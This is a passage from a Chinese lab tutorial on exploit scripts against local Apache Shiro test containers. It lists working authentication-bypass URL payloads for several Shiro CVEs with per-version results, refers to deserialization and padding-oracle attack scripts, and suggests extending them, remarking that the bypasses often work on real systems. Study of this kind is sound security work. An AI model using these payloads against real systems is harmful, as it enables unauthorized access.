复用反而要处理连接状态，直接关掉更省事。**同一个问题，量级不同，答案就不同。**

**`main()`** —— 先过滤活着的端口：

```python
alive = []
for port, ver in TARGETS:
    st, _ = probe(args.host, port, "/")
    if st == 0:
        print("[!] %d (%s) 连不上，跳过" % (port, ver))
    else:
        alive.append((port, ver))
```

四个端口对应四个 JVM 在**同一个容器**里跑（`shiro-bypass`），
只起一半的情况很常见，跳过就行，不用整体失败。

表格宽度是算出来的，不是写死的：

```python
width = max(len(p) for p, _, _ in PAYLOADS) + 2
head = "  %-*s %-6s" % (width, "payload", "cve")
```

`%-*s` 是"用变量控制宽度"的格式化写法：宽度从参数里取，左对齐。
加 payload 不用改排版代码。

### 4.3 实测结果

```
  payload           cve    1.4.2     1.5.2     1.6.0     1.7.1
  ----------------------------------------------------------------
  /admin            -      302       302       302       302
  /xxx/..;/admin    1957   404       302       400       400
  /;/admin          11989  BYPASS    302       400       400
  /admin/%3b        13933  302       302       400       400
  /admin/%20        17523  302       302       302       302
```

四个值的含义：

- `BYPASS` —— Shiro 没匹配到 `/admin/**`，Spring 却把它路由到了 `/admin`，flag 到手
- `302` —— 被 `authc` 拦住，跳 `/login`
- `400` —— 1.6.0 起加了 `InvalidRequestFilter`，含分号 / 编码分号的 URL 直接被拒
- `404` —— **Shiro 放行了**（不是 302），但 Spring 没把这条路径映射到 controller

`404` 值得单独说：它说明**鉴权这一层已经绕过去了**，只是这个靶场的路由没接住。
真实系统里换个路由、或者换成 `/xxx/..;/admin/list` 这种具体接口，
往往就能打进去。所以 404 是"半个成功"，不是"失败"。

三处和 CVE 公告对不上的地方，`shiro/README.md` 里有详细解释，这里只列结论：

- 1.4.2 的 `/xxx/..;/admin` 是 404 不是 BYPASS（1957 在这套路由下没打穿）
- 1.5.2 的 `/;/admin` 是 302 而不是绕过（没有 context-path，分号被当路径参数吃掉）
- `/admin/%20`（17523）四个版本全 302，这套 Tomcat 9.0.46 环境下没打通

**这就是"实测 > 背 CVE"的价值**：公告写的是"某版本以下受影响"，
具体到某个应用、某个 Tomcat 版本、有没有 context-path，结果可能完全不同。
靶场的意义就是让你亲手看到这些差异。

### 4.4 怎么加自己的 payload

改 `PAYLOADS` 列表就行，格式是 `(路径, 说明, 归属 CVE)`：

```python
PAYLOADS = [
    ("/admin", "基线：什么都不改", "-"),
    ("/xxx/..;/admin", "经典 1957：多一层再回退", "1957"),
    ...
]
```

想验证别的思路（比如双写 `//admin/..;/admin`、编码斜杠 `%2f`），
直接往列表里加，表格会自动适配宽度。

---

## 5. 四个脚本的共同套路

这几条是可以抄到别的靶场去的：

**① 先探活 → 再指纹 → 再动手**

三个脚本开头都在做同一件事：确认目标活着、确认打的是对的靶场。
`shiro721` 甚至专门花一次请求问 `/__oracle` 在不在。
省这一步的代价是"跑了 50 秒才发现打错端口"。

**② 失败要有可读的原因**

看这几句错误信息：

```
[x] 连不上，先把靶场起起来：docker compose up -d shiro-550
[x] 取不到 /payloads/cc6.bin（HTTP 404，0 字节）。确认靶场已经起来，并且 --lab.mode=550。
[x] /__oracle 返回 404：这个端口没开 721 模式，确认打的是 8902。
```

都不是 `raise Exception("failed")`。写脚本时多想一步"别人（包括三天后的自己）
看到这句话能不能直接动手"，比多写十个功能有用。

**③ 判定通道要选本质的**

- 550 用"`/out/flag.txt` 里有没有 FLAG{"，不用响应长度、不用时间
- 721 用状态码，不用自定义头
- bypass 用"200 + FLAG{"，不只看 200

共同点：都选**响应里本质的、不会被时序影响的部分**。

**④ 零依赖**

`urllib` + `socket` + `http.client` + `base64` + `threading`，
连 AES 都是手写的。代价是代码长，收益是"复制走就能跑"。

**⑤ 慢的地方要能看见进度**

721 的 `[k/23] 已用 xx.xs` 不是装饰。一个跑 50 秒没有任何输出的脚本，
你不知道它是在工作还是卡死了。

---

## 6. 附录

### 6.1 一键跑

```bash
cd ~/代码库/靶场

python3 shiro/poc/aes.py               # AES 自检，应该打印"自检通过"
python3 shiro/poc/shiro550_exp.py      # 约 1 秒
python3 shiro/poc/shiro721_exp.py      # 约 50 秒
python3 shiro/poc/bypass_exp.py        # 约 5 秒（16 payload × 4 版本）
```

### 6.2 常见报错对照

- `[x] 连不上，先把靶场起起来` —— 容器没起，或端口被占。
  `./lab.sh status` 看端口，`docker compose up -d shiro-550` 起服务
- `[x] 取不到 /payloads/cc6.bin` —— 三个模式都会生成同一个 `cc6.bin`，
  所以这几乎只可能是容器刚起、JVM 还没 ready，等 5 秒重跑；
  或者端口被别的东西占了（`./lab.sh status` 看一眼）
- `[x] /__oracle 返回 404` —— 打到了 8901 或 8903~8906，721 只在 8902
- `[x] 登录没拿到 rememberMe cookie` —— 账号密码错，或者 `/login` 表单字段改了
- `[x] 第 x 块第 y 字节复核不通过` —— oracle 在并发下不稳，`--workers 2` 重跑
- `[x] 字典跑完都没命中` —— 不是 1.2.4（去看 721），或者 classpath 里没有
  commons-collections
- 721 跑完 HTTP 302 —— 先看 `X-Lab-Oracle` 是不是 `ok`；
  如果是 `deser`，说明填充对了但序列化流不对，检查 `principal_root.bin` 有没有下全

### 6.3 想深入的方向

- 把 `aes.py` 补上解密方向，验证"解出来的明文 == 原 payload"，
  同时补 InvSBox / InvMixColumns
- 把 550 的 payload 换成 CC1、CommonsBeanutils 等别的链（需要本地 ysoserial）
- 给 721 加 `--resume`，中断后从第 k 块继续（中间值存 JSON）
- 把 `bypass_exp.py` 的 `PAYLOADS` 扩成"路径变异生成器"，
  试试 `%252f`、`;.css`、大小写混合这些
